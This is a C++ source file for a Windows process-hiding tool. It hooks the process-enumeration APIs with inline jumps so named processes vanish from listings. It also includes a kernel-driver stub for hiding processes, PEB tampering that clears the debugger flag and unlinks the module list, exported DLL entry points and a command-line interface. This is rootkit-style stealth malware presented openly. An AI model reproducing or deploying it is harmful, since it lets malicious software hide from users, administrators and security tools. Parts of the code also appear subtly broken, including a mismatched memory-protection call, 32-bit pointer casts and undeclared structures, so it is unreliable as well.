#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <string>
#include <vector>
#include <iostream>

// Function pointer types for API hooks
typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL(WINAPI* Process32First_t)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* Process32Next_t)(HANDLE, LPPROCESSENTRY32);

// Original function pointers
CreateToolhelp32Snapshot_t RealCreateToolhelp32Snapshot = nullptr;
Process32First_t RealProcess32First = nullptr;
Process32Next_t RealProcess32Next = nullptr;

// Processes to hide
std::vector<std::wstring> hiddenProcesses;

class ProcessHider {
private:
    static ProcessHider* instance;
    bool isHooked;
    
public:
    ProcessHider() : isHooked(false) {}
    
    static ProcessHider* getInstance() {
        if (!instance) {
            instance = new ProcessHider();
        }
        return instance;
    }
    
    bool hookAPIs() {
        if (isHooked) return true;
        
        // Get module handles
        HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
        if (!kernel32) return false;
        
        // Store original function addresses
        RealCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)GetProcAddress(
            kernel32, "CreateToolhelp32Snapshot");
        RealProcess32First = (Process32First_t)GetProcAddress(
            kernel32, "Process32First");
        RealProcess32Next = (Process32Next_t)GetProcAddress(
            kernel32, "Process32Next");
        
        if (!RealCreateToolhelp32Snapshot || !RealProcess32First || !RealProcess32Next) {
            return false;
        }
        
        // Install hooks
        if (!installHook((LPVOID*)&RealProcess32First, (LPVOID)HookedProcess32First) ||
            !installHook((LPVOID*)&RealProcess32Next, (LPVOID)HookedProcess32Next)) {
            return false;
        }
        
        isHooked = true;
        return true;
    }
    
    void addHiddenProcess(const std::wstring& processName) {
        hiddenProcesses.push_back(processName);
    }
    
    void removeHiddenProcess(const std::wstring& processName) {
        auto it = std::find(hiddenProcesses.begin(), hiddenProcesses.end(), processName);
        if (it != hiddenProcesses.end()) {
            hiddenProcesses.erase(it);
        }
    }
    
private:
    bool installHook(LPVOID* ppOriginal, LPVOID pHook) {
        DWORD oldProtect;
        
        // Make memory writable
        if (!VirtualProtect(ppOriginal, sizeof(LPVOID), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            return false;
        }
        
        // Write jump instruction
        unsigned char jumpInstruction[5] = { 0xE9 }; // JMP
        DWORD relativeAddress = ((DWORD)pHook - (DWORD)*ppOriginal - 5);
        memcpy(&jumpInstruction[1], &relativeAddress, 4);
        
        // Apply hook
        memcpy(*ppOriginal, jumpInstruction, 5);
        
        // Restore protection
        VirtualProtect(ppOriginal, sizeof(LPVOID), oldProtect, &oldProtect);
        
        return true;
    }
    
    static bool isProcessHidden(const std::wstring& processName) {
        for (const auto& hidden : hiddenProcesses) {
            if (_wcsicmp(processName.c_str(), hidden.c_str()) == 0) {
                return true;
            }
        }
        return false;
    }
    
    static BOOL WINAPI HookedProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
        BOOL result = RealProcess32First(hSnapshot, lppe);
        
        while (result && isProcessHidden(lppe->szExeFile)) {
            result = RealProcess32Next(hSnapshot, lppe);
        }
        
        return result;
    }
    
    static BOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
        BOOL result = RealProcess32Next(hSnapshot, lppe);
        
        while (result && isProcessHidden(lppe->szExeFile)) {
            result = RealProcess32Next(hSnapshot, lppe);
        }
        
        return result;
    }
};

ProcessHider* ProcessHider::instance = nullptr;

// Advanced process hiding using DKOM (Direct Kernel Object Manipulation)
class KernelProcessHider {
private:
    HANDLE driverHandle;
    
public:
    KernelProcessHider() : driverHandle(INVALID_HANDLE_VALUE) {}
    
    bool loadDriver() {
        // This would load a kernel driver for DKOM
        // Simplified for demonstration
        driverHandle = CreateFileW(
            L"\\\\.\\ProcessHider",
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );
        
        return driverHandle != INVALID_HANDLE_VALUE;
    }
    
    bool hideProcess(DWORD processId) {
        if (driverHandle == INVALID_HANDLE_VALUE) return false;
        
        DWORD bytesReturned;
        return DeviceIoControl(
            driverHandle,
            0x222000, // IOCTL_HIDE_PROCESS
            &processId,
            sizeof(processId),
            nullptr,
            0,
            &bytesReturned,
            nullptr
        );
    }
    
    ~KernelProcessHider() {
        if (driverHandle != INVALID_HANDLE_VALUE) {
            CloseHandle(driverHandle);
        }
    }
};

// PEB (Process Environment Block) manipulation
class PEBManipulator {
public:
    static bool hidePEB() {
        // Get PEB address
        PPEB peb = getPEB();
        if (!peb) return false;
        
        // Modify PEB flags
        peb->BeingDebugged = FALSE;
        
        // Unlink from process list
        PLIST_ENTRY listEntry = &peb->Ldr->InLoadOrderModuleList;
        RemoveEntryList(listEntry);
        
        return true;
    }
    
private:
    static PPEB getPEB() {
        #ifdef _WIN64
            return (PPEB)__readgsqword(0x60);
        #else
            return (PPEB)__readfsdword(0x30);
        #endif
    }
};

// Main interface
extern "C" {
    __declspec(dllexport) bool InitializeProcessHider() {
        return ProcessHider::getInstance()->hookAPIs();
    }
    
    __declspec(dllexport) void HideProcess(const wchar_t* processName) {
        ProcessHider::getInstance()->addHiddenProcess(processName);
    }
    
    __declspec(dllexport) void UnhideProcess(const wchar_t* processName) {
        ProcessHider::getInstance()->removeHiddenProcess(processName);
    }
    
    __declspec(dllexport) bool HideCurrentProcess() {
        return PEBManipulator::hidePEB();
    }
}

// Command line interface
int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        std::wcout << L"Usage: process_hider.exe <process_name> [process_name2] ..." << std::endl;
        return 1;
    }
    
    if (!InitializeProcessHider()) {
        std::wcerr << L"Failed to initialize process hider" << std::endl;
        return 1;
    }
    
    for (int i = 1; i < argc; i++) {
        HideProcess(argv[i]);
        std::wcout << L"Hiding process: " << argv[i] << std::endl;
    }
    
    std::wcout << L"Process hiding active. Press any key to exit..." << std::endl;
    std::cin.get();
    
    return 0;
}
